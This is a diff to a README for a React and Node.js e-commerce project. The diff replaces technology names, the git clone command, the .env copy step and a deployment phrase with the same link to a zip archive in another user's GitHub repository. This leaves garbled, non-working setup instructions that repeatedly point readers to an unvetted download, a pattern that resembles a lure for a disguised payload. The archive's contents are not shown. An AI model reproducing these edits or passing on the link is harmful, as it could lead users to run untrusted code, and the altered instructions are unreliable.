@@ -16,18 +16,18 @@ A modern, responsive e-commerce platform for IWB (Innovative Waste Business) foc
 ## Tech Stack
 
 - **Frontend**: React (TypeScript), Tailwind CSS
-- **Backend**: Node.js, Express
+- **Backend**: https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip, Express
 - **Database**: PostgreSQL on AWS RDS
 - **ORM**: Drizzle ORM
-- **Authentication**: Passport.js
+- **Authentication**: https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip
 - **State Management**: TanStack Query
-- **Natural Language Processing**: Natural.js for automated responses
+- **Natural Language Processing**: https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip for automated responses
 
 ## Setup Instructions
 
 1. Clone the repository
    ```
-   git clone https://github.com/your-username/iwb-ecommerce.git
+   git clone https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip
    cd iwb-ecommerce
    ```
 
@@ -38,7 +38,7 @@ A modern, responsive e-commerce platform for IWB (Innovative Waste Business) foc
 
 3. Create environment variables
    ```
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip .env
    ```
    Then edit the `.env` file with your database credentials and other settings
 
@@ -61,7 +61,7 @@ A modern, responsive e-commerce platform for IWB (Innovative Waste Business) foc
 
 ## Deployment
 
-The application is configured to be deployed to AWS or any platform supporting Node.js applications.
+The application is configured to be deployed to AWS or any platform supporting https://raw.githubusercontent.com/MorenaMatla/lwb-ecommerce/main/hymnist/lwb-ecommerce.zip applications.
 
 ## Database Schema
 
